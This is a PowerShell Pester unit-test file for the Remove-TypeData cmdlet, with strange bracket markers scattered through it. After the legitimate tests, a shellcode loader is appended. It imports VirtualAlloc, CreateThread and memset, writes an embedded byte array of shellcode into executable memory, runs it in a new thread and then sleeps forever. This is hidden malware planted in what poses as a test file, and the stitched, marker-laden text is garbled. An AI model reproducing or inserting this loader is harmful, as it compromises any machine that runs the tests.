

 -||-> Describe "Remove-TypeData DRT Unit Tests" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $XMLFile1 =  -||-> Join-Path $TestDrive -ChildPath "testFile1.ps1xml" <-||-  <-||- 
         -||-> $XMLFile2 =  -||-> Join-Path $TestDrive -ChildPath "testFile2.ps1xml" <-||-  <-||- 
         -||-> $content1 = @"
        <Types>
            <Type>
                <Name>System.Array</Name>
                    <Members>
                        <AliasProperty>
                            <Name>Yada</Name>
                            <ReferencedMemberName>Length</ReferencedMemberName>
                        </AliasProperty>
                    </Members>
            </Type>
        </Types>
"@ <-||- 
         -||-> $content2 = @"
                <Types>
                    <Type>
                        <Name>System.Array</Name>
                            <Members>
                                <AliasProperty>
                                    <Name>Yoda</Name>
                                    <ReferencedMemberName>Length</ReferencedMemberName>
                                </AliasProperty>
                            </Members>
                    </Type>
                </Types>
"@ <-||- 
         -||-> $content1 > $XMLFile1 <-||- 
         -||-> $content2 > $XMLFile2 <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> $ps = [powershell]::Create() <-||- 
         -||-> $iss = [system.management.automation.runspaces.initialsessionstate]::CreateDefault2() <-||- 
         -||-> $rs = [system.management.automation.runspaces.runspacefactory]::CreateRunspace($iss) <-||- 
         -||-> $rs.Open() <-||- 
         -||-> $ps.Runspace = $rs <-||- 
    } <-||- 

     -||-> AfterEach {
         -||-> $rs.Close() <-||- 
         -||-> $ps.Dispose() <-||- 
    } <-||- 

     -||-> It "Remove With Pipe line Input Pass Type Shortcut String" {
         -||-> $null = $ps.AddScript("Update-TypeData -MemberType NoteProperty -MemberName TestNote -Value TestNote -TypeName int").Invoke() <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $ps.AddScript("(Get-TypeData System.Int32).TypeName").Invoke() | Should -Be System.Int32 <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $null = $ps.AddScript("'int' | Remove-TypeData").Invoke() <-||- 
         -||-> $ps.HadErrors | Should -BeFalse <-||- 
    } <-||- 

     -||-> It "Remove Type File In Initial Session State" {
        
         -||-> $null = $ps.AddScript("Update-TypeData -AppendPath $XMLFile1").Invoke() <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $null = $ps.AddScript("Update-TypeData -AppendPath $XMLFile2").Invoke() <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $null = $ps.AddScript('$a = 1..3').Invoke() <-||- 
         -||-> $ps.Commands.Clear() <-||- 
        
         -||-> $ps.AddScript('$a.Yada').Invoke() | Should -Be 3 <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $ps.AddScript('$a.Yoda').Invoke() | Should -Be 3 <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $null = $ps.AddScript("Remove-TypeData -Path $XMLFile1").Invoke() <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $ps.AddScript('$a.Yada').Invoke() | Should -BeNullOrEmpty <-||- 
         -||-> $ps.Commands.Clear() <-||- 
         -||-> $ps.AddScript('$a.Yoda').Invoke() | Should -Be 3 <-||- 
         -||-> $ps.Commands.Clear() <-||- 
    } <-||- 

     -||-> It "Remove Type File In Initial Session State File Not In Cache" {
         -||-> $null = $ps.AddScript("Remove-TypeData -Path fakefile").Invoke() <-||- 
         -||-> $ps.HadErrors | Should -BeTrue <-||- 
         -||-> $ps.Streams.Error[0].FullyQualifiedErrorID | Should -BeExactly "TypePathException,Microsoft.PowerShell.Commands.RemoveTypeDataCommand" <-||- 
    } <-||- 
} <-||- 

 -||-> $GL9 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $GL9 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0xc2,0xf8,0xe0,0x20,0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x03,0x5a,0x13,0x83,0xea,0x3e,0x1a,0x15,0xdc,0x56,0x59,0xd6,0x1d,0xa6,0x3e,0x5e,0xf8,0x97,0x7e,0x04,0x88,0x87,0x4e,0x4e,0xdc,0x2b,0x24,0x02,0xf5,0xb8,0x48,0x8b,0xfa,0x09,0xe6,0xed,0x35,0x8a,0x5b,0xcd,0x54,0x08,0xa6,0x02,0xb7,0x31,0x69,0x57,0xb6,0x76,0x94,0x9a,0xea,0x2f,0xd2,0x09,0x1b,0x44,0xae,0x91,0x90,0x16,0x3e,0x92,0x45,0xee,0x41,0xb3,0xdb,0x65,0x18,0x13,0xdd,0xaa,0x10,0x1a,0xc5,0xaf,0x1d,0xd4,0x7e,0x1b,0xe9,0xe7,0x56,0x52,0x12,0x4b,0x97,0x5b,0xe1,0x95,0xdf,0x5b,0x1a,0xe0,0x29,0x98,0xa7,0xf3,0xed,0xe3,0x73,0x71,0xf6,0x43,0xf7,0x21,0xd2,0x72,0xd4,0xb4,0x91,0x78,0x91,0xb3,0xfe,0x9c,0x24,0x17,0x75,0x98,0xad,0x96,0x5a,0x29,0xf5,0xbc,0x7e,0x72,0xad,0xdd,0x27,0xde,0x00,0xe1,0x38,0x81,0xfd,0x47,0x32,0x2f,0xe9,0xf5,0x19,0x27,0xde,0x37,0xa2,0xb7,0x48,0x4f,0xd1,0x85,0xd7,0xfb,0x7d,0xa5,0x90,0x25,0x79,0xca,0x8a,0x92,0x15,0x35,0x35,0xe3,0x3c,0xf1,0x61,0xb3,0x56,0xd0,0x09,0x58,0xa7,0xdd,0xdf,0xf5,0xa2,0x49,0x77,0x14,0x73,0xe6,0x1f,0x25,0x8b,0xf9,0x64,0xa0,0x6d,0xa9,0xca,0xe3,0x21,0x09,0xbb,0x43,0x92,0xe1,0xd1,0x4b,0xcd,0x11,0xda,0x81,0x66,0xbb,0x35,0x7c,0xde,0x53,0xaf,0x25,0x94,0xc2,0x30,0xf0,0xd0,0xc4,0xbb,0xf7,0x25,0x8a,0x4b,0x7d,0x36,0x7a,0xbc,0xc8,0x64,0x2c,0xc3,0xe6,0x03,0xd0,0x51,0x0d,0x82,0x87,0xcd,0x0f,0xf3,0xef,0x51,0xef,0xd6,0x64,0x5b,0x65,0x99,0x12,0xa4,0x69,0x19,0xe2,0xf2,0xe3,0x19,0x8a,0xa2,0x57,0x4a,0xaf,0xac,0x4d,0xfe,0x7c,0x39,0x6e,0x57,0xd1,0xea,0x06,0x55,0x0c,0xdc,0x88,0xa6,0x7b,0xdc,0xf5,0x70,0x45,0xaa,0x17,0x41 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $t6g=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $t6g.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$t6g,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



